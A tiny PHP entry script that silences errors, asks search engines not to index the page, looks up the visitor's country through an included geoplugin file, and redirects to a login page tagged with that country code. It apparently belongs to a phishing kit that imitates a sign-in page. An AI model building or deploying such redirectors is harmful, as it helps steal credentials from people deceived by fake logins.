<?php
@session_start();  
error_reporting(0); 
header("X-Robots-Tag: noindex, nofollow", true);
include("geoplugin.php");


header("location:login/index.php?".$countrycode."-EN");

?>